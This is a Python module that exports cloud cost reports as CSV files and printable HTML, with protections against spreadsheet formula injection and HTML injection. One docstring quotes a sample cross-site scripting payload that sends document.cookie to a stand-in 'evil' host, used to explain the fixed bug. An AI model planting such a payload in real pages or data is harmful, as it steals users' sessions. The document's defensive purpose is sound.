"""
nable report exporter: CSV and HTML/printable-PDF output.

Generates shareable reports from nable data that can be opened by anyone,
no Claude Desktop required. Finance teams get CSVs; stakeholders get HTML
they can print to PDF from the browser.

Outputs to: ~/.finops/exports/
"""
from __future__ import annotations

import csv
import html as _html
import io
import json
import os
from datetime import datetime, date, timedelta
from pathlib import Path
from typing import Any

_EXPORT_DIR = Path.home() / ".finops" / "exports"

# ── Brand colors (matches getnable.com) ──────────────────────────────────────
_GREEN  = "#22C55E"
_RED    = "#EF4444"
_AMBER  = "#F59E0B"
_SLATE  = "#0F172A"
_MUTED  = "#64748B"
_BORDER = "#E2E8F0"
_BG     = "#F8FAFC"


def _export_dir() -> Path:
    _EXPORT_DIR.mkdir(parents=True, exist_ok=True)
    return _EXPORT_DIR


def _ts() -> str:
    return datetime.now().strftime("%Y%m%d_%H%M%S")


# ── CSV helpers ───────────────────────────────────────────────────────────────

def _csv_safe(v: Any) -> Any:
    """Neutralize spreadsheet formula injection (CWE-1236). Cell values come from
    resource/tag/service names a lower-privileged user can set, and these CSVs are
    opened in Excel/Sheets by finance. A leading '=', '+', '-', '@', tab, or CR is
    treated as a formula; prefix it with an apostrophe (the OWASP fix) to force text.
    Non-strings pass through unchanged."""
    if not isinstance(v, str):
        return v
    if v and v[0] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + v
    return v


def _csv_str(rows: list[list[Any]], headers: list[str]) -> str:
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(headers)
    w.writerows([[_csv_safe(c) for c in row] for row in rows])
    return buf.getvalue()


def cost_summary_csv(data: dict) -> str:
    rows = []
    period = data.get("period", {})
    by_provider = data.get("by_provider", {})
    for prov, info in by_provider.items():
        total = info.get("total_usd", 0) if isinstance(info, dict) else info
        rows.append([prov.upper(), period.get("start", ""), period.get("end", ""), round(total, 2)])
    rows.sort(key=lambda r: -r[3])
    return _csv_str(rows, ["Provider", "Period Start", "Period End", "Total USD"])


def services_csv(data: dict) -> str:
    rows = []
    period = data.get("period", {})
    by_service = data.get("by_service", data.get("grand_by_service", {}))
    for svc, amt in by_service.items():
        rows.append([svc, period.get("start", ""), period.get("end", ""), round(amt, 2)])
    rows.sort(key=lambda r: -r[3])
    return _csv_str(rows, ["Service", "Period Start", "Period End", "Total USD"])


def anomalies_csv(data: dict) -> str:
    rows = []
    for a in data.get("anomalies", []):
        rows.append([
            a.get("provider", ""),
            a.get("service", ""),
            a.get("account_id", ""),
            a.get("severity", ""),
            a.get("direction", ""),
            a.get("change", ""),
            a.get("today", ""),
            a.get("baseline_avg", ""),
            a.get("detected", ""),
        ])
    return _csv_str(rows, [
        "Provider", "Service", "Account", "Severity", "Direction",
        "Change %", "Current Spend", "Baseline Avg", "Detected At",
    ])


def rightsizing_csv(data: dict) -> str:
    rows = []
    for r in data.get("recommendations", []):
        rows.append([
            r.get("instance_id", ""),
            r.get("name", r.get("instance_id", "")),
            r.get("instance_type", ""),
            r.get("recommended_type", ""),
            r.get("avg_cpu_pct", ""),
            r.get("monthly_savings", r.get("monthly_savings_usd", 0)),
            r.get("account_id", ""),
            r.get("region", ""),
        ])
    rows.sort(key=lambda r: -(r[5] or 0))
    return _csv_str(rows, [
        "Instance ID", "Name", "Current Type", "Recommended Type",
        "Avg CPU %", "Monthly Savings USD", "Account", "Region",
    ])


def savings_csv(data: dict) -> str:
    rows = []
    for r in data.get("recommendations", []):
        rows.append([
            r.get("id", ""),
            r.get("source", ""),
            r.get("provider", ""),
            r.get("resource_name", r.get("resource_id", "")),
            r.get("description", ""),
            r.get("status", ""),
            r.get("estimated_monthly_savings_usd", 0),
            r.get("verified_monthly_savings_usd", ""),
            r.get("generated_at", ""),
            r.get("acted_on_at", ""),
        ])
    return _csv_str(rows, [
        "ID", "Source", "Provider", "Resource", "Description",
        "Status", "Est. Monthly USD", "Verified Monthly USD",
        "Generated", "Acted On",
    ])


def budgets_csv(data: dict) -> str:
    rows = []
    for b in data.get("budgets", []):
        rows.append([
            b.get("name", ""),
            b.get("scope_type", ""),
            b.get("scope_value", ""),
            b.get("period", ""),
            b.get("limit_usd", 0),
            b.get("spent_usd", ""),
            b.get("pct_used", ""),
            b.get("status", ""),
        ])
    return _csv_str(rows, [
        "Budget Name", "Scope Type", "Scope", "Period",
        "Limit USD", "Spent USD", "% Used", "Status",
    ])


# ── HTML report ───────────────────────────────────────────────────────────────

class SafeHTML(str):
    """Markup this module built itself and vouches for.

    Every other cell value is escaped. Resource names, service names, tag values
    and account aliases all come from the customer's cloud, and a report is a
    file someone opens in a browser and forwards to their finance team. A volume
    named `<img src=x onerror="fetch('https://evil/'+document.cookie)">` was
    written into the export as live markup, so whoever could name a resource
    could run script in the reader's browser.

    Escaping unconditionally would have flattened the severity and change badges
    below into visible angle brackets, which is presumably why nothing escaped
    at all. Marking the two places that produce markup is the version that keeps
    both properties: safe by default, and deliberate where it is not.
    """


def _cell(value: Any) -> str:
    return str(value) if isinstance(value, SafeHTML) else _html.escape(str(value))


def _html_table(headers: list[str], rows: list[list[Any]], col_align: list[str] | None = None) -> str:
    if not rows:
        return "<p style='color:#94a3b8;font-size:13px'>No data.</p>"
    aligns = col_align or ["left"] * len(headers)
    th = "".join(
        f"<th style='padding:8px 12px;text-align:{aligns[i]};font-weight:600;"
        f"font-size:12px;letter-spacing:.04em;text-transform:uppercase;"
        f"color:{_MUTED};border-bottom:2px solid {_BORDER}'>{_cell(h)}</th>"
        for i, h in enumerate(headers)
    )
    body = ""
    for ri, row in enumerate(rows):
        bg = "#fff" if ri % 2 == 0 else _BG
        tds = "".join(
            f"<td style='padding:8px 12px;text-align:{aligns[ci]};"
            f"font-size:13px;border-bottom:1px solid {_BORDER}'>{_cell(cell)}</td>"
            for ci, cell in enumerate(row)
        )
        body += f"<tr style='background:{bg}'>{tds}</tr>"
    return (
        f"<table style='width:100%;border-collapse:collapse;margin-top:12px'>"
        f"<thead><tr>{th}</tr></thead><tbody>{body}</tbody></table>"
    )


def _section(title: str, content: str) -> str:
    return (
        f"<div style='margin-bottom:40px'>"
        f"<div style='font-size:11px;letter-spacing:.06em;text-transform:uppercase;"
        f"color:{_MUTED};margin-bottom:8px'>/ {title}</div>"
        f"{content}"
        f"</div>"
    )


def _stat_box(label: str, value: str, color: str = _SLATE) -> str:
    return (
        f"<div style='background:#fff;border:1px solid {_BORDER};border-radius:8px;"
        f"padding:20px 24px;flex:1;min-width:160px'>"
        f"<div style='font-size:11px;letter-spacing:.04em;text-transform:uppercase;"
        f"color:{_MUTED};margin-bottom:6px'>{label}</div>"
        f"<div style='font-size:28px;font-weight:400;letter-spacing:-.02em;color:{color}'>{value}</div>"
        f"</div>"
    )


def _change_badge(pct: float) -> str:
    if pct > 10:
        color, arrow = _RED, "↑"
    elif pct < -10:
        color, arrow = _GREEN, "↓"
    else:
        color, arrow = _MUTED, "~"
    return SafeHTML(f"<span style='color:{color};font-weight:600'>{arrow}{abs(pct):.0f}%</span>")


def _severity_badge(sev: str) -> str:
    colors = {"high": _RED, "medium": _AMBER, "low": _MUTED}
    c = colors.get(sev.lower(), _MUTED)
    return SafeHTML(f"<span style='color:{c};font-weight:600;text-transform:uppercase;font-size:11px'>{_html.escape(sev)}</span>")


def build_html_report(
    title: str,
    period_start: str,
    period_end: str,
    cost_summary: dict | None = None,
    services: dict | None = None,
    anomalies: dict | None = None,
    rightsizing: dict | None = None,
    savings: dict | None = None,
    budgets: dict | None = None,
    generated_by: str = "nable",
) -> str:
    # Caller-supplied (MCP tool args). Escape before interpolating into HTML so a
    # title like "<script>..." cannot inject markup into the generated report.
    title = _html.escape(title or "")
    generated_by = _html.escape(generated_by or "")
    generated_at = datetime.now().strftime("%B %d, %Y at %H:%M UTC")
    sections_html = ""

    # ── Cost summary stats ─────────────────────────────────────────────────────
    if cost_summary:
        total = cost_summary.get("grand_total_usd", 0)
        by_prov = cost_summary.get("by_provider", {})
        stats_html = "<div style='display:flex;gap:16px;flex-wrap:wrap;margin-bottom:16px'>"
        stats_html += _stat_box("Total Spend", f"${total:,.0f}")

        prov_rows = []
        for prov, info in by_prov.items():
            amt = info.get("total_usd", 0) if isinstance(info, dict) else info
            pct = (amt / total * 100) if total else 0
            prov_rows.append([prov.upper(), f"${amt:,.2f}", f"{pct:.1f}%"])

        prov_rows.sort(key=lambda r: -float(r[1].replace("$", "").replace(",", "")))
        for r in prov_rows[:3]:
            stats_html += _stat_box(r[0], r[1])
        stats_html += "</div>"

        table = _html_table(
            ["Provider", "Spend", "Share"],
            prov_rows,
            ["left", "right", "right"],
        )
        sections_html += _section("Cost Summary", stats_html + table)

    # ── Top services ───────────────────────────────────────────────────────────
    if services:
        by_svc = services.get("by_service", services.get("grand_by_service", {}))
        total_svc = sum(by_svc.values()) if by_svc else 1
        rows = [
            [svc, f"${amt:,.2f}", f"{amt / total_svc * 100:.1f}%"]
            for svc, amt in sorted(by_svc.items(), key=lambda x: -x[1])[:20]
        ]
        sections_html += _section(
            "Top Services",
            _html_table(["Service", "Spend", "Share"], rows, ["left", "right", "right"]),
        )

    # ── Anomalies ──────────────────────────────────────────────────────────────
    if anomalies and anomalies.get("anomalies"):
        rows = []
        for a in anomalies["anomalies"]:
            rows.append([
                a.get("provider", "").upper(),
                a.get("service", ""),
                _severity_badge(a.get("severity", "")),
                a.get("change", ""),
                a.get("today", ""),
                a.get("baseline_avg", ""),
            ])
        sections_html += _section(
            f"Anomalies ({len(rows)})",
            _html_table(
                ["Provider", "Service", "Severity", "Change", "Current", "Baseline"],
                rows, ["left", "left", "left", "right", "right", "right"],
            ),
        )

    # ── Rightsizing ────────────────────────────────────────────────────────────
    if rightsizing and rightsizing.get("recommendations"):
        recs = rightsizing["recommendations"]
        total_savings = sum(r.get("monthly_savings", r.get("monthly_savings_usd", 0)) for r in recs)
        rows = [
            [
                r.get("name", r.get("instance_id", "")),
                r.get("instance_type", ""),
                r.get("recommended_type", ""),
                f"{r.get('avg_cpu_pct', 0):.0f}%",
                f"${r.get('monthly_savings', r.get('monthly_savings_usd', 0)):,.0f}/mo",
            ]
            for r in sorted(recs, key=lambda x: -(x.get("monthly_savings", x.get("monthly_savings_usd", 0))))[:20]
        ]
        summary_line = (
            f"<p style='font-size:14px;color:{_SLATE};margin-bottom:8px'>"
            f"<strong>{len(recs)} recommendation{'s' if len(recs) != 1 else ''}</strong> · "
            f"<span style='color:{_GREEN}'>${total_savings:,.0f}/mo</span> potential savings "
            f"(<span style='color:{_GREEN}'>${total_savings * 12:,.0f}/yr</span>)</p>"
        )
        sections_html += _section(
            "Rightsizing Recommendations",
            summary_line + _html_table(
                ["Instance", "Current Type", "Recommended", "Avg CPU", "Savings"],
                rows, ["left", "left", "left", "right", "right"],
            ),
        )

    # ── Realized savings ───────────────────────────────────────────────────────
    if savings:
        pot = savings.get("potential_monthly_usd", 0)
        act = savings.get("acted_on_monthly_usd", 0)
        ver = savings.get("verified_monthly_usd", 0)
        stats_html = "<div style='display:flex;gap:16px;flex-wrap:wrap;margin-bottom:16px'>"
        stats_html += _stat_box("Open Potential", f"${pot:,.0f}/mo")
        stats_html += _stat_box("Acted On", f"${act:,.0f}/mo", _AMBER)
        stats_html += _stat_box("Verified Savings", f"${ver:,.0f}/mo", _GREEN)
        stats_html += "</div>"
        by_status = savings.get("by_status", {})
        rows = [[k.replace("_", " ").title(), str(v)] for k, v in by_status.items()]
        sections_html += _section(
            "Realized Savings",
            stats_html + _html_table(["Status", "Count"], rows),
        )

    # ── Budgets ────────────────────────────────────────────────────────────────
    if budgets and budgets.get("budgets"):
        rows = []
        for b in budgets["budgets"]:
            pct = b.get("pct_used", 0) or 0
            bar_color = _RED if pct >= 100 else _AMBER if pct >= 80 else _GREEN
            bar = (
                f"<div style='background:{_BORDER};border-radius:3px;height:6px;width:120px;display:inline-block;vertical-align:middle'>"
                f"<div style='background:{bar_color};height:6px;border-radius:3px;width:{min(pct,100):.0f}%'></div>"
                f"</div> {pct:.0f}%"
            )
            rows.append([
                b.get("name", ""),
                b.get("scope_type", ""),
                f"${b.get('limit_usd', 0):,.0f}",
                f"${b.get('spent_usd', 0):,.0f}",
                bar,
            ])
        sections_html += _section(
            "Budgets",
            _html_table(
                ["Budget", "Scope", "Limit", "Spent", "Used"],
                rows, ["left", "left", "right", "right", "left"],
            ),
        )

    # ── Assemble full page ─────────────────────────────────────────────────────
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>{title}</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
        background:{_BG};color:{_SLATE};line-height:1.5;padding:0}}
  @media print{{body{{background:#fff}} .no-print{{display:none}}}}
</style>
</head>
<body>
<div style='max-width:960px;margin:0 auto;padding:40px 32px'>

  <!-- Header -->
  <div style='display:flex;justify-content:space-between;align-items:flex-start;
              margin-bottom:40px;padding-bottom:24px;border-bottom:1px solid {_BORDER}'>
    <div>
      <div style='font-family:monospace;font-size:11px;letter-spacing:.08em;
                  text-transform:uppercase;color:{_MUTED};margin-bottom:8px'>
        {generated_by} · cost report
      </div>
      <h1 style='font-size:28px;font-weight:400;letter-spacing:-.02em'>{title}</h1>
      <div style='font-size:13px;color:{_MUTED};margin-top:4px'>
        {period_start} → {period_end}
      </div>
    </div>
    <div style='text-align:right'>
      <div style='font-size:11px;color:{_MUTED}'>Generated</div>
      <div style='font-size:13px;color:{_SLATE}'>{generated_at}</div>
      <div class='no-print' style='margin-top:8px'>
        <button onclick='window.print()' style='background:{_SLATE};color:#fff;border:0;
          border-radius:6px;padding:6px 14px;font-size:12px;cursor:pointer'>
          Print / Save PDF
        </button>
      </div>
    </div>
  </div>

  <!-- Sections -->
  {sections_html or "<p style='color:" + _MUTED + "'>No data sections selected.</p>"}

  <!-- Footer -->
  <div style='margin-top:48px;padding-top:20px;border-top:1px solid {_BORDER};
              font-size:11px;color:{_MUTED};display:flex;justify-content:space-between'>
    <span>Generated by <a href='https://getnable.com' style='color:{_MUTED}'>nable</a></span>
    <span>Data as of {period_end}</span>
  </div>

</div>
</body>
</html>"""


# ── Write files ───────────────────────────────────────────────────────────────

def write_report(
    title: str,
    period_start: str,
    period_end: str,
    sections: dict[str, dict],
    formats: list[str] = None,
) -> dict[str, str]:
    """
    Write a report in one or more formats. Returns {format: file_path}.

    sections: {
        "cost_summary": {...},
        "services": {...},
        "anomalies": {...},
        "rightsizing": {...},
        "savings": {...},
        "budgets": {...},
    }
    formats: ["html", "csv"] (defaults to both)
    """
    if formats is None:
        formats = ["html", "csv"]

    ts = _ts()
    safe_title = title.lower().replace(" ", "_").replace("/", "_")[:40]
    base = _export_dir() / f"{safe_title}_{ts}"
    output: dict[str, str] = {}

    if "html" in formats:
        html = build_html_report(
            title=title,
            period_start=period_start,
            period_end=period_end,
            cost_summary=sections.get("cost_summary"),
            services=sections.get("services"),
            anomalies=sections.get("anomalies"),
            rightsizing=sections.get("rightsizing"),
            savings=sections.get("savings"),
            budgets=sections.get("budgets"),
        )
        path = base.with_suffix(".html")
        path.write_text(html, encoding="utf-8")
        output["html"] = str(path)

    if "csv" in formats:
        csv_files: dict[str, str] = {}
        if "cost_summary" in sections and sections["cost_summary"]:
            csv_files["cost_summary"] = cost_summary_csv(sections["cost_summary"])
        if "services" in sections and sections["services"]:
            csv_files["services"] = services_csv(sections["services"])
        if "anomalies" in sections and sections["anomalies"]:
            csv_files["anomalies"] = anomalies_csv(sections["anomalies"])
        if "rightsizing" in sections and sections["rightsizing"]:
            csv_files["rightsizing"] = rightsizing_csv(sections["rightsizing"])
        if "savings" in sections and sections["savings"]:
            csv_files["savings"] = savings_csv(sections["savings"])
        if "budgets" in sections and sections["budgets"]:
            csv_files["budgets"] = budgets_csv(sections["budgets"])

        # Zip all CSVs into a single file
        if csv_files:
            import zipfile
            zip_path = base.with_suffix(".zip")
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
                for name, content in csv_files.items():
                    zf.writestr(f"{name}.csv", content)
            output["csv_zip"] = str(zip_path)

            # Also write individual CSVs
            csv_dir = _export_dir() / f"{safe_title}_{ts}_csv"
            csv_dir.mkdir(exist_ok=True)
            for name, content in csv_files.items():
                (csv_dir / f"{name}.csv").write_text(content, encoding="utf-8")
            output["csv_dir"] = str(csv_dir)

    return output
